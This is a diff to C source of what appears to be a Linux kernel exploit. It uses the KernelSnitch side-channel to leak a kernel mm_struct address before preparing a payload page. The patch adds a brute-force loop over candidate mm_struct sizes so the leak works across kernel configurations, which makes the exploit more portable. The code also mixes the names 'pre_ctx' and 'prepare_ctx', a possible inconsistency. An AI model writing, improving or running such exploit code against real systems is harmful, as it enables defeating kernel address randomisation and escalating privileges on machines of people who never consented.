@@ -44,7 +44,7 @@ int g_dyn_symbols_ready = 0;
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_CONF);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -627,7 +627,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_CONF);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -670,14 +670,52 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
+    pr_info("KernelSnitch mm_struct leak failed with MM_STRUCT_SZ=0x%zx, trying alternatives\n",
+            (size_t)MM_STRUCT_SZ);
     kernelsnitch_cleanup(ks);
     ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
+
+    /* mm_struct 大小可能因 CONFIG 不同而变化，自动尝试候选值 */
+    static const size_t mm_candidates[] = {
+      0x3a0, 0x3b0, 0x3d0, 0x3e0, 0x3f0, 0x400,
+      0x410, 0x420, 0x430, 0x440, 0x450, 0x460,
+      0x470, 0x480, 0x490, 0x4a0, 0x4b0, 0x4c0,
+      0x4d0, 0x4e0, 0x4f0, 0x500,
+    };
+    int found_alt = 0;
+    for (size_t ci = 0; ci < sizeof(mm_candidates)/sizeof(mm_candidates[0]); ci++) {
+      size_t alt_sz = mm_candidates[ci];
+      if (alt_sz == (size_t)MM_STRUCT_SZ)
+        continue;
+      pr_info("KernelSnitch retry with MM_STRUCT_SZ=0x%zx\n", alt_sz);
+      ks = kernelsnitch_setup(alt_sz, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      if (!kernelsnitch_found_collisions(ks)) {
+        pr_warning("KernelSnitch collision finding failed (alt 0x%zx)\n", alt_sz);
+        kernelsnitch_cleanup(ks);
+        ks = NULL;
+        continue;
+      }
+      kernelsnitch_bruteforce(ks);
+      leaked = ks->mm_struct;
+      if (leaked != (uintptr_t)-1) {
+        pr_success("KernelSnitch found mm_struct=0x%zx with size=0x%zx\n",
+                   (size_t)leaked, alt_sz);
+        found_alt = 1;
+        break;
+      }
+      pr_warning("KernelSnitch mm_struct leak failed (alt 0x%zx)\n", alt_sz);
+      kernelsnitch_cleanup(ks);
+      ks = NULL;
     }
-    cleanup_page_prepare_state();
-    return 0;
+
+    if (!found_alt) {
+      pr_warning("KernelSnitch mm_struct leak failed (all sizes tried)\n");
+      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+        kill_child(prepare_ctx.childs[i]);
+      }
+      cleanup_page_prepare_state();
+      return 0;
+    }
   }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
